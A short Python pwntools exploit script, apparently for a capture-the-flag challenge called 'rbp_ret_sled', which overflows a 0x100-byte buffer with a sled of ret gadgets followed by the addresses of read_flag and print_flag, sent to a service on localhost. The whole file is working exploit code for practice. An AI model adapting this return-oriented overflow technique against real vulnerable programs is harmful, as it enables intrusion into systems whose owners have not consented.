#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


c = remote('localhost', 40003)
#c = process("./share/rbp_ret_sled")
#gdb.attach(c, 'b *vuln')

elf = ELF("./share/rbp_ret_sled")
rop = ROP(elf)

ret_addr = rop.find_gadget(['ret'])[0]

# buffer overflow to rbp_ret_sled
overflow_size = 0x100
payload = p64(elf.symbols['read_flag']) + p64(elf.symbols['print_flag']) + p64(ret_addr)
payload = flat({}, filler=p64(ret_addr), length=(overflow_size - len(payload))) + payload

c.sendafter('sled', payload)

c.interactive()
#print(c.recvline())


